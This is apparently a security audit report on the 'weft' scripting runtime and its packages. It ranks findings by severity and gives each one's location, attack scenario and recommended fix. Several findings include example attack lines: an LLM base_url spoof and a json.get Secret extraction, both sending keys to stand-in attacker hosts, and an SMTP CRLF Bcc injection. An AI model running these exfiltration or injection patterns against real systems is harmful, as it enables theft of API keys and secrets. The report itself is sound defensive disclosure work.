### P1 — High

#### P1-1 — `llmBaseTrustedForEnvKey` trusts by substring (env API key exfil)

**Location:** `internal/stdlib/llm.go:308-331` (`llmBaseTrustedForEnvKey`), used by `guardLLMEnvKey` at `:334-347` and all chat/stream paths (`:834`, `:899`, `:1227`, `:1311`).

**Attack scenario**

A vendor module with `@llm` / `@agent` (or app script) does:

```weft
llm.chat("hi", {
  "base_url": "https://attacker.example/api.openai.com/v1",
  // api_key omitted → filled from OPENAI_API_KEY / WEFT_API_KEY
})
```

Because trust is `strings.Contains(base, "api.openai.com")` (also `api.anthropic.com`, `localhost`, `127.0.0.1`, and each `WEFT_LLM_TRUST_HOSTS` token), the Host is **attacker.example** while the path contains the magic substring. The env key is sent in `Authorization`.

Equivalents:

- `https://api.openai.com.evil.com/v1` (attacker controls DNS for that name)
- `https://evil-localhost.example/v1` (contains `localhost`)
- `WEFT_LLM_TRUST_HOSTS=corp` matching `https://notcorp.evil/v1` if misconfigured substring

**Impact**

Exfiltration of process-env LLM API keys to attacker-controlled HTTPS endpoints, defeating the supply-chain guard described in SECURITY.md. Works for any code path that loads env keys into `opts.api_key` (default opts) without an explicit non-env key.

**Recommended fix**

1. Parse `base` with `url.Parse`, trust on **hostname only** (exact match or strict suffix: `host == h || strings.HasSuffix(host, "."+h)`).
2. Allowlist: `api.openai.com`, `api.anthropic.com`, `127.0.0.1`, `localhost`, `::1`, plus parsed hosts from `WEFT_LLM_TRUST_HOSTS`.
3. Reject userinfo in URL; normalize port.
4. Add regression tests for path/subdomain spoof cases.

#### P1-2 — Secret seal bypass via unrestricted `json.get` (and related struct indexing)

**Location:**

- Seal (only field opcode): `internal/vm/ops.go:149-151`
- Bypass: `internal/stdlib/json.go:197-203` (`jsonPathGet` on `KindStruct` reads `so.Fields[p]` with no Secret check)
- Related: `asMap` on structs in `helpers.go:71-76` walks Secret fields without TypeName check (unlike `valueToGo` at `:111-113`)
- Related: `fieldOrKey` in `http.go:267-269`, `collections` groupKey `collectionspkg.go:152-155`

**Attack scenario**

`json` is **not** restricted. Any module that obtains a `Secret` value (e.g. app passes `secrets.get("OPENAI_API_KEY")` into a helper, or module has `secrets` grant) can:

```weft
// s is Secret — s.value is sealed at language level
key := json.get(s, "value")?   // returns plain str of the secret
http.post("https://evil.example/sink", key)  // if module also has http
```

`json.stringify(s)` correctly redacts (`valueToGo` → `***`); the path getter does not.

**Impact**

Secret “seal” is incomplete: accidental print/JSON still safe, but intentional extraction does not require `secrets.unwrap` / `secrets` package. Weakens the boundary when apps pass Secrets into third-party modules that only declare `@http` (or any net capability).

**Recommended fix**

1. In `jsonPathGet` / `jsonPathSet` / `asMap` / any `so.Fields[...]` helper: if `TypeName == "Secret"`, refuse or return sealed error (same message as VM).
2. Optionally seal `setField` for Secret (`ops.go:251-258`) so values cannot be overwritten/replaced via mutation.
3. Tests: `json.get(secrets.from("x"), "value")` must fail; `json.stringify` still `***`.

### P2 — Medium

#### P2-1 — stdlib `archive.unzip` / `archive.gunzip` weaker than pkgman extract

**Location:** `internal/stdlib/archive.go:105-154` (`unzip`), `:211-248` (`gunzip`); compare pkgman `install.go:539-601` (MaxExtractedFiles / MaxExtractedBytes).

**Attack scenario**

With `archive` capability (`@io` or explicit `archive`):

- Zip of tens of thousands of small files → disk inode DoS (stdlib unzip has **no** total file count / total uncompressed budget; only per-entry `LimitReader` 200 MiB).
- `archive.gunzip` uses unbounded `io.Copy` → classic gzip bomb to disk.

Pkgman install path is better capped; script/module extract is not aligned.

**Impact**

Local DoS (disk fill) for apps/modules with archive grant; not a capability escape.

**Recommended fix**

Reuse pkgman constants (`MaxExtractedBytes` / `MaxExtractedFiles`) in stdlib unzip/untar; add LimitReader + size check to gunzip; reject when total exceeded.

#### P2-2 — SMTP header injection in `email.send`

**Location:** `internal/stdlib/emailpkg.go:133-136`

**Attack scenario**

With `email` capability, `subject` / `from` / `to` containing `\r\n` injects extra headers (e.g. Bcc) into the raw message:

```text
Subject: hi\r\nBcc: attacker@evil.com
```

Host is SSRF-checked (`:129-130`); message fields are not.

**Impact**

Header injection / smuggling on outbound mail; capability-gated but easy footgun for agents building subjects from LLM/user text.

**Recommended fix**

Strip/reject `\r`, `\n`, `\x00` in from/to/subject (and consider RFC 2047 encoding). Prefer `net/mail` Address parsing for from/to.

#### P2-3 — `tokensave` / `ml` grant surface is powerful by design

**Location:**

- `packages/tokensave/weft.json`: `"capability_profile": "agent"`, `"capabilities": ["fs", "env"]` → **llm + ollama + vllm + http + fs + env**
- `packages/ml/weft.json`: `"capability_profile": "agent"`, `"capabilities": ["fs"]` → llm/http/fs; **code uses `env.get` without declaring `env`** (`packages/ml/embed.weft:3-5,43-65`)

**Attack scenario**

1. **tokensave (intentional breadth):** module can `env.get("OPENAI_API_KEY")` as plain string and `http.post` to any public URL — **bypasses** `guardLLMEnvKey` entirely (guard only applies to llm package HTTP, not raw `http`).
2. **ml:** either fails at runtime without `env` grant, or if operators add `env` to make it work, same exfil class as tokensave.

**Impact**

Not a runtime bug for tokensave (declared grants); high residual supply-chain risk if users install untrusted copies. ml’s missing `env` is a functional/package hygiene issue that may push operators to over-grant.

**Recommended fix**

1. Document clearly: `@agent` + `env` ≡ “this package can read all process secrets and exfil over HTTP.”
2. Prefer llm package only for keys (no raw `env` for API keys); or filter `env.get` for known secret key names unless `secrets` granted.
3. Add `"env"` to ml if required, or switch embed helpers to llm/ollama packages that use guarded clients.
4. Consider a narrower profile e.g. `@llm-fs` without ambient env.

### P3 — Low / hardening

#### P3-1 — `htmxOOBWrap` does not HTML-escape `id`

**Location:** `internal/stdlib/web.go:1099-1128`

If `id` is attacker-controlled (`"` breakout), attribute injection into OOB markup. Usually app-controlled; treat as XSS helper footgun when id comes from request params.

**Fix:** escape `id` for HTML attributes (or allow only `[A-Za-z0-9_-]`).

#### P3-2 — Cookie `SameSite` free-form; `Secure` default false

**Location:** `web.go:1061-1095`

Defaults: `HttpOnly=true`, `SameSite=Lax`, `Secure=false` (dev-friendly). `same_site` accepts any string without `\r\n;`. Fine for local HTTP; document production should set `secure: true`.

#### P3-3 — Secret `setField` not sealed

**Location:** `vm/ops.go:251-258`

Can mutate Secret fields without reading them. Integrity issue only; pair with P1-2.

#### P3-4 — `Equal` compares Secret field values structurally

**Location:** `runtime/value.go:383-394`

Equality oracle if both sides are Secrets (e.g. `secrets.from` + candidate). Needs secrets capability to craft guesses; low practical risk for high-entropy keys.

#### P3-5 — mold: pure, no host escape; minor DoS only

**Location:** `packages/mold/*`, `weft.json` has **no** capabilities (correct pure module).

- Uses only `json` / local modules; no `fs`/`http`/`sh`/`eval`.
- No regex → no ReDoS.
- Deeply nested `object`/`list` schemas can recurse in `check_value` / `check_object` (`validate.weft`) → stack/CPU DoS on hostile models (P3). Cap depth (e.g. 32) and list length.

---

#### P3-6 — Multipart form: per-part 8 MiB, body 32 MiB

**Location:** `web.go:608` `maxBodyBytes`; `parseFormParts` `:988` `LimitReader(p, 8<<20)`.

Reasonable. No part-count cap — many tiny parts could burn CPU (P3). Optional max parts (e.g. 1024).

---

#### P3-7 — Data connectors ignore netsafe (by design)

`redis`/`mongo`/`db`/`nats`/`amqp` dial without `netsafe` IP policy. Gated by capabilities; needed for private DBs. Residual: grant of `@data` ≡ internal network access. Documented by profiles.

---

#### P3-8 — Unrestricted packages that are not “pure”

Examples still available to vendor modules without grants: `re` (ReDoS if fed attacker regex), `io` (stdin/stdout only — low risk), `platform` (hostname leak — low), `webrtc` (in-memory signaling hub only; server bind still needs `web`). Acceptable; no host FS/exec.

## Verdict

Prior hardening from `9c66cbc` largely **still holds**: SSRF dial pinning and metadata/CGNAT blocks remain for HTTP (including `insecure`), sockets, and email hosts; package install git/url paths stay argument-safe and size-capped; capabilities/profiles still default-deny host-power stdlib for vendor modules; web `before` applies to static and WebSocket; response headers drop CRLF; Secrets redact in print/JSON. Two **high** issues need attention before treating the env-key / Secret story as closed: (1) `llmBaseTrustedForEnvKey` substring matching enables real env API-key exfiltration to attacker hosts, and (2) the Secret field seal is only enforced on VM field ops, so unrestricted `json.get` (and similar struct indexing) can recover plaintext. Medium gaps are stdlib archive bomb limits lagging pkgman, SMTP header injection, and the deliberately broad `tokensave`/`ml` agent grants (with ml under-declaring `env`). mold is pure validation with no host escape. Overall posture is appropriate for a host-power 0.3.x toolkit with package capability boundaries, but the LLM trust-host check should be fixed promptly and Secret sealing made consistent across all field-access APIs.
